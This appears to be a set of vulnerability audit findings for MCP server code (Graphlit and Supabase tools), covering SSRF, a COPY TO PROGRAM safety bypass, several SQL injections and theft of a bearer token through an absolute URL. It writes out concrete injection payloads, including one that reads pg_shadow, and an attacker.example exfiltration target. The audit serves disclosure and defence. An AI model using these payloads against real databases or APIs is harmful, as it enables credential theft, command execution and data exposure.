dep_evidence: node_modules/graphlit-client v1.0.20260111002, dist/client.js:1065 ingestEncodedFile() only wraps a GraphQL mutation (Documents.IngestEncodedFile) with the given name/data/mimeType — it performs no local path validation and never touches the filesystem itself, so the file read is entirely unguarded local code in tools.ts.

excerpt: if (url) { const fetchResponse = await fetch(url); if (!fetchResponse.ok) { throw new Error(`Failed to fetch data from ${url}: ${fetchResponse.statusText}`); } ...
sink: Node built-in fetch() issues a server-side HTTP(S) request to the caller-supplied url directly from the MCP process (not proxied through the Graphlit cloud API like the other web/url tools), then base64-encodes the body into an image-similarity filter sent to Graphlit.
why: Unlike every other URL-accepting tool in this file (ingestUrl, webCrawl, webMap, screenshotPage), retrieveImages performs the HTTP fetch locally in the MCP server process with no scheme/host allow-list or private-IP block, so a caller can make the server probe internal/cloud-metadata endpoints; failure text (fetchResponse.statusText) is thrown uncaught and can act as a reachability oracle. Node's built-in fetch (undici) restricts schemes to http/https so file:// is not reachable, and the fetched bytes are not returned verbatim to the caller (only used for embedding match), which keeps this from meeting full Tier A - it is a real, if largely blind, SSRF primitive.

sink: a caller-supplied 'COPY (...) TO PROGRAM '<os-command>'' statement is classified DQL/LOW risk and executed against the Postgres connection via postgres_client.execute_statement
guard: partial: classify_statement()'s CopyStmt special case only inspects stmt_node.is_from (COPY FROM=write vs COPY TO=read) and never checks stmt_node.is_program, so 'COPY (SELECT 1) TO PROGRAM '<cmd>'' (is_from=False, is_program=True) is misclassified as an ordinary low-risk export and is always allowed, even in default SAFE mode; the DB-level READ ONLY transaction that genuinely blocks INSERT/UPDATE/DELETE/DDL in SAFE mode (asyncpg Transaction, 'query += " READ ONLY"' in transaction.py) does not stop COPY TO PROGRAM either, since it does not modify the database itself
dep_evidence: pglast 7.3 installed at .venv/lib/python3.13/site-packages/pglast/ast.py:1433 defines CopyStmt with a distinct 'is_program': 'bool' slot separate from 'is_from', proving the field the target ignores is exposed by the parser it uses; asyncpg (installed, version per repo lockfile) transaction.py appends 'READ ONLY' to the START TRANSACTION statement only when readonly=True, confirmed by static read of transaction.py
why: execute_postgresql's whole purpose is to run caller-supplied SQL, and ordinary writes/DDL are genuinely blocked in SAFE mode by both the pglast-based classifier and a real asyncpg READ ONLY transaction (verified in code) -- but COPY's risk classification only looks at direction (is_from), not at is_program, so a COPY ... TO PROGRAM statement bypasses the entire safety system and runs an OS command via the Postgres server without ever needing live_dangerously/UNSAFE mode. Actual impact depends on the connecting Postgres role holding COPY-to-program privilege (superuser or pg_execute_server_program membership), which is a deployment fact this repo cannot confirm, hence Tier B.
contract: SAFETY SYSTEM: ... LOW RISK: Read operations (SELECT, EXPLAIN) - allowed in SAFE mode ... The database client starts in SAFE mode by default for safety

sink: spliced verbatim into single-quoted string literals inside get_table_schema.sql (e.g. tc.table_schema = '{schema_name}'), then the resulting text is parsed by pglast and executed as-is against the database
guard: bypassable: SQLValidator defines validate_schema_name()/validate_table_name() which reject spaces/empty strings, but grep across supabase_mcp/ shows these are never called anywhere in the execution path (only referenced from tests/services/database/sql/test_sql_validator.py) -- get_table_schema_query() calls plain str.replace() with zero escaping. A value like table="x' UNION SELECT column_name,data_type,'t',NULL,1,NULL,NULL,NULL,'f' FROM information_schema.columns WHERE table_schema='auth' -- " still parses as a single SelectStmt, which SQLSafetyConfig always classifies LOW risk, so it executes even in default SAFE mode without ever needing live_dangerously.
why: schema_name/table are declared as plain strings in the tool's own signature and are string-spliced directly into quoted SQL literals with no escaping or allowlisting; because the final query still parses as one SELECT statement, the safety manager's risk-based gate (which only looks at statement type, not content) always treats it as low-risk and permits it regardless of safety mode, giving a full read-oriented SQL injection into arbitrary schemas/tables.
contract:
Parameters:
- schema_name: Name of the schema (e.g., 'public', 'auth')
- table: Name of the table to inspect

SAFETY: This is a low-risk read operation that can be executed in SAFE mode.

sink: spliced verbatim into single-quoted string literals inside get_tables.sql (e.g. WHERE nspname = '{schema_name}'), then parsed and executed as-is
guard: bypassable: same as get_table_schema -- SQLValidator.validate_schema_name() exists but is dead code, never invoked from get_tables_query() or handle_query(); e.g. schema_name="public' UNION SELECT relname,'BASE TABLE',NULL,0,0,0,0 FROM pg_catalog.pg_class WHERE relnamespace=(SELECT oid FROM pg_namespace WHERE nspname='auth') -- " still parses as one SelectStmt (LOW risk, always allowed).
why: schema_name is a plain caller-controlled string that is string-spliced into a raw SQL template with no escaping; the injected text remains part of a single SELECT/UNION ALL statement so the pglast-based risk classifier (which never inspects content, only top-level statement type) always scores it LOW risk and the safety manager allows it in default SAFE mode, letting a caller read table metadata (and via UNION, arbitrary rows) from schemas/tables never intended to be exposed by this fixed-purpose listing tool.

sink: field/operator/value from each filter object are concatenated verbatim into a WHERE-clause fragment which becomes the 'sql' query parameter sent to the Management API endpoint /v1/projects/{ref}/analytics/endpoints/logs.all
guard: none: only 'value' gets a naive single-quote doubling when it's a non-digit string (log_manager.py:74-75); 'field' and 'operator' are never validated, escaped, or checked against an allowlist of real column names/operators before being spliced into the query text.
why: retrieve_logs documents filters as structured {field, operator, value} objects, implying field is a known log column name -- but _build_where_clause() inserts field and operator with a raw f-string and no allowlist/escaping, so a filter such as {"field": "1=1 OR event_message LIKE '%%' -- ", "operator": "=", "value": "1"} lets a caller fully control the generated analytics query beyond the intended structured-filter contract, independent of the separately-documented (and intentionally arbitrary) custom_query path.

sink: spliced verbatim into a single-quoted ILIKE predicate inside get_migrations.sql (('{name_pattern}' = '' OR name ILIKE '%' || '{name_pattern}' || '%')), executed against supabase_migrations.schema_migrations
guard: none: name_pattern is inserted with plain str.replace(), no quote-escaping or length/charset restriction at all (unlike limit/offset which are cast through str() from ints, and include_full_queries which is a bool).
why: name_pattern is a caller-controlled free-text string documented only as an ILIKE search pattern, but it is spliced directly into a quoted SQL literal; a value like "x' UNION SELECT usename,passwd,NULL,NULL,NULL FROM pg_shadow -- " (column casts adjusted to match the 5-column SELECT) remains syntactically a single SelectStmt, so the pglast-based classifier scores it LOW risk and it executes in default SAFE mode without ever needing live_dangerously, exposing arbitrary table contents beyond the tool's advertised migration-listing purpose.
contract: name_pattern: Optional pattern to filter migrations by name. Uses SQL ILIKE pattern matching (case-insensitive). The pattern is automatically wrapped with '%' wildcards

sink: httpx.AsyncClient.build_request(url=path) is sent via self.client.send(request) in send_request(); the client was created with default header Authorization: Bearer <settings.supabase_access_token> (management_client.py:46) attached to every request it sends
guard: bypassable: api_manager.replace_path_params() only rejects a path if leftover '{placeholder}' tokens remain after substitution -- an absolute URL like 'https://attacker.example/collect' has no placeholders so it passes through untouched. httpx's own Client._merge_url() (installed httpx 0.28.1, _client.py:391-410) returns a non-relative URL unchanged, ignoring base_url, while _merge_headers() (_client.py:424-429) unconditionally merges the client's default headers -- including Authorization -- onto every request regardless of destination. Separately, APISafetyConfig.get_risk_level() defaults any path/method not present in its small hardcoded PATH_SAFETY_CONFIG table to LOW risk (safety_configs.py get_risk_level, default fallthrough), so a GET to an arbitrary external URL is always allowed even in default SAFE mode.
dep_evidence: httpx 0.28.1 installed at .venv/lib/python3.13/site-packages/httpx/_client.py: _merge_url (~line 391-410) shows 'if merge_url.is_relative_url: ... else: return merge_url' (absolute URLs bypass base_url), and _merge_headers (~line 424-429) always merges self.headers into every request.
why: send_management_api_request lets the caller choose method and path freely; because path is never checked to be a relative Supabase API path (only checked for unresolved {..} placeholders) and httpx attaches the client's default Authorization header to any URL including absolute ones outside base_url, a caller can set path to an attacker-controlled URL and the server will send a request there carrying the project's Supabase Management API access token in the Authorization header -- exfiltrating that credential -- and because unlisted paths default to LOW risk, this requires no unsafe-mode toggle at all.
contract: path: API path (e.g. /v1/projects/{ref}/functions) ... The {ref} placeholder (project reference) is automatically injected from settings
